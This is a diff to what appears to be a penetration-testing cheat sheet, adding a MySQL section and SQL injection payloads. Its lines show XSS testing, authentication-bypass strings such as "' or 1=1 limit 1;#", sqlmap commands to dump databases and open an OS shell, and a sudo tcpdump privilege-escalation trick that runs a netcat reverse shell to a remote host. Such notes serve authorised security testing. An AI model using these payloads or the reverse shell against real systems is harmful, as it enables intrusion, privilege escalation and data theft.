@@ -60,6 +60,7 @@ Previous Play Icon:
   - [Kicking the Tires](#kicking-the-tires)
   - [Automated Priv Escalation Scripts](#automated-priv-escalation-scripts)
   - [If You have a Reverse Shell...](#if-you-have-a-reverse-shell)
+    - [MySQL](#mysql)
   - [Metasploit](#metasploit)
   - [Python Scripts](#python-scripts)
 - [Actions on Objectives](#actions-on-objectives)
@@ -181,7 +182,7 @@ Digging deeper into particular services, and running massive vulnerability scans
   
 ## Web Application Attack  
 ### Cross Site Scripting (XSS)  
-[Portswigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+[Portswigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)  
 [Bug Bounty XSS Cheat Sheet](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)  
 ```bash
 # Enter this into a web form to check for XSS vuln
@@ -203,6 +204,9 @@ nc -nlvp 81
 ### SQL Injection    
 [OWASP SQL Injection Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)  
 ```bash
+# Simple SQL Injection Authentication Bypass
+username: any' or 1=1 limit 1;#
+
 # Enter to a login page to check for SQL inj
 username: ' or '1' = '1'
 password: ' or '1' = '1' 
@@ -211,6 +215,7 @@ password: ' or '1' = '1'
 sqlmap -u "domain" --dump
 # use sqlmap to gain a remote shell
 sqlmap -u "domain" --os-shell
+sqlmap -u "domain" --tables
 
 ```  
 ### XPath Injection  
@@ -592,6 +597,19 @@ $ perl —e 'exec "/bin/sh";'
 $ echo $’id\n/bin/netcat $ip 443 -e /bin/bash’ > /tmp/.test
 chmod +x /tmp/.test
 sudo tcpdump -ln -I eth- -w /dev/null -W 1 -G 1 -z /tmp/.tst -Z root
+
+```  
+### MySQL  
+```bash 
+# log into MySQL database
+mysql -u [user] -p [password]
+# show all databases
+show databases
+use [database name]
+# see tables
+show tables
+# display contents
+select * from [table name]:
 
 ```
 __Exploiting Services__
